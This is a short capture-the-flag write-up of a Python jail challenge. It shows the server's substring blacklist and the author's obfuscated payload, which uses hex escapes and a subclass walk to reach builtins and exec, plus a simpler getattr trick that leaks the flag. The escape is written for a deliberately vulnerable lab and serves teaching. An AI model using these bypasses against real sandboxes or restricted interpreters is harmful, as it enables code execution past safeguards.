# exceptional pyjail

i think this is mmmmmmmmmmmmmmmmmmmmmmmmmmmmm's first challenge

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/063867e8-cfc6-4f86-acaa-619421764c88)

Dockerfile
```dockerfile
FROM ubuntu:20.04

RUN apt-get update -y && \
    apt-get install -y python3-pip python3-dev ncat

WORKDIR /app

COPY . /app

RUN echo "#!/bin/sh\npython3 -u server.py 2>&1" > ./wrapper.sh

RUN chmod -R 555 /app

USER 1000:1000

CMD ncat -klvp 15002 -m 999999 -e ./wrapper.sh
```

server.py
```python
#!/usr/bin/env python3

import string
import sys

a = input(">>> ")
if any(i in a for i in ["import", "__", "[", "]", ".", "exec", "eval"]):
  print("not allowed")
  sys.exit()
if any(i not in string.printable for i in a):
  print("no")
  sys.exit()
with open("flag.txt") as file:
  flag = file.read()
sys.stdout = "lol"
del sys
exec(a)
```

## solution

stderr is still available so i made this overengineered solution where stdout is replaced with stderr but it didn't even matter anyways because `getattr(dict(),'\x5f\x5fgetitem\x5f\x5f')(flag)` also works

```py
getattr(getattr(getattr(getattr(getattr(getattr(getattr(getattr((),'\x5f\x5fclass\x5f\x5f'),'\x5f\x5fbase\x5f\x5f'),'\x5f\x5fsubclasses\x5f\x5f')(),'\x5f\x5fgetitem\x5f\x5f')(-4),'\x5f\x5finit\x5f\x5f'),'\x5f\x5fglobals\x5f\x5f'),'\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f'),'\x5f\x5fgetitem\x5f\x5f')('ex\x65c')("\x71\x3d\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x73\x79\x73\x27\x29\x3b\x71\x2e\x73\x74\x64\x6f\x75\x74\x3d\x71\x2e\x73\x74\x64\x65\x72\x72");print(flag)
```

what the above does is get `().__class__.__base__.__subclasses__()[-4].__init__.__globals__['__builtins__']['exec']('q=__import__('sys');q.stdout=q.stderr');print(flag)` which is overkill ngl
